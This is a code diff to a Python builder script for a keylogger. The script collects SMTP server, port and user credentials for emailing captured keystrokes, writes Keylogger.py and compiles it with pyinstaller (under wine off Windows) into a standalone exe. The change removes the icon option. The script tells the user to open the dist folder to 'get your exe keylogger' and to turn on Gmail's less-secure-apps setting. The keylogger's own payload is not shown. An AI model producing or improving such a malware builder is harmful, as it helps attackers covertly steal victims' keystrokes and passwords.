@@ -35,10 +35,10 @@ def main(argv):
 				print('{}\tyou choosed {} then you want Use Websocket Notification{}'.format(R,sendtype,R))
 			break
 	if sendtype == 1:
-		iconfile = input('\t{0}Enter Icon path (must be an .ico file) : {1}'.format(B,B))
-		if iconfile == "":
-			print("You Enter Nothing then no icon will be added to exe")
-			iconfile = "NONE"
+		#iconfile = input('\t{0}Enter Icon path (must be an .ico file) : {1}'.format(B,B))
+		#if iconfile == "":
+			#print("You Enter Nothing then no icon will be added to exe")
+			#iconfile = "NONE"
 		gserver = input('\t{0}Enter The Smtp Server : {1}'.format(B,B))
 		gport = int(input('\t{0}Enter The Smtp port : {1}'.format(B,B)))
 		guser = input('\t{0}Enter The Smtp User : {1}'.format(B,B))
@@ -53,9 +53,9 @@ def main(argv):
 		writefcontent("Keylogger.py",klgstr)
 		print(getfcontent("Keylogger.py"))
 		if sys.platform != "win32":
-			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
+			os.system("sudo wine pyinstaller --onefile --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
 		else:
-			os.system("pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='pywintypes32.dll' Keylogger.py")
+			os.system("pyinstaller --onefile --hidden-import='pywintypes32.dll' Keylogger.py")
 		print("open dist folder and get your exe keylogger\nif you use Gmail allow less secure applications from this link https://myaccount.google.com/lesssecureapps ")
 	else:
 		print('Not implemented yet')
